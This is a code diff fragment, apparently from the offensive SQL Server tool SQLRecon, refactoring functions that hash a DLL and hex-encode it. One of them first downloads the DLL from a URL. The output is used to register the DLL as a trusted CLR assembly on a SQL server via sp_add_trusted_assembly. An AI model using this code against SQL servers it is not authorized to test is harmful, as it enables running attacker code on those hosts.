+                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
+                using (SHA512 sha512 = SHA512.Create())
                 {
-                    using (FileStream fileStream = System.IO.File.OpenRead(dll))
+                    using (FileStream fileStream = File.OpenRead(dll))
                     {
-                        foreach (var hash in SHA512.ComputeHash(fileStream))
+                        foreach (byte hash in sha512.ComputeHash(fileStream))
                         {
                             dllHash += hash.ToString("x2");
                         }
@@ -495,7 +444,7 @@ namespace SQLRecon.Modules
             }
             catch (FileNotFoundException)
             {
-                _print.Error(string.Format("Unable to load {0}", dll), true);
+                Print.Error($"Unable to load {dll}", true);
             }
 
             dllArr[0] = dllHash;
@@ -509,7 +458,7 @@ namespace SQLRecon.Modules
         /// </summary>
         /// <param name="dll"></param>
         /// <returns></returns>
-        private string[] _convertDLLToSQLBytesWeb(string dll)
+        private static string[] _convertDLLToSQLBytesWeb(string dll)
         {
             string[] dllArr = new string[2];
             string dllHash = "";
@@ -517,42 +466,35 @@ namespace SQLRecon.Modules
 
             try
             {
-                // Get the SHA-512 hash of the DLL so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
-                using (SHA512 SHA512 = SHA512Managed.Create())
+                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
+                using SHA512 sha512 = SHA512.Create();
+                using WebClient client = new WebClient();
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+                Print.Status($"Downloading DLL from {dll}", true);
+
+                byte[] content = client.DownloadData(dll);
+
+                using MemoryStream stream = new MemoryStream(content);
+                BinaryReader reader = new BinaryReader(stream);
+                byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
+                stream.Close();
+                reader.Close();
+
+                Print.Status($"DLL is {dllByteArray.Length} bytes, this will take a minute ...", true);
+
+                foreach (var hash in sha512.ComputeHash(dllByteArray))
                 {
-                    using (var client = new WebClient())
-                    {
-                        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
-                        _print.Status(string.Format("Downloading DLL from {0}", dll), true);
-
-                        var content = client.DownloadData(dll);
-
-                        using (var stream = new MemoryStream(content))
-                        {
-                            BinaryReader reader = new BinaryReader(stream);
-                            byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
-                            stream.Close();
-                            reader.Close();
-
-                            _print.Status(string.Format("DLL is {0} bytes, this will take a minute ...", dllByteArray.Length), true);
-
-                            foreach (var hash in SHA512.ComputeHash(dllByteArray))
-                            {
-                                dllHash += hash.ToString("x2");
-                            }
-                            // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
-                            foreach (Byte b in dllByteArray)
-                            {
-                                dllBytes += b.ToString("X2");
-                            }
-                        }
-                    }
-
+                    dllHash += hash.ToString("x2");
+                }
+                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
+                foreach (Byte b in dllByteArray)
+                {
+                    dllBytes += b.ToString("X2");
                 }
             }
             catch (Exception ex)
             {
-                _print.Error(string.Format("Unable to download DLL from {0}", ex), true);
+                Print.Error($"Unable to download DLL from {ex}", true);
             }
 
             dllArr[0] = dllHash;
@@ -566,7 +508,7 @@ namespace SQLRecon.Modules
         /// </summary>
         /// <param name="dll"></param>
         /// <returns></returns>
-        private string[] _convertDLLToSQLBytes(string dll)
+        private static string[] _convertDLLToSQLBytes(string dll)
         {
             string[] dllArr = new string[2];
 
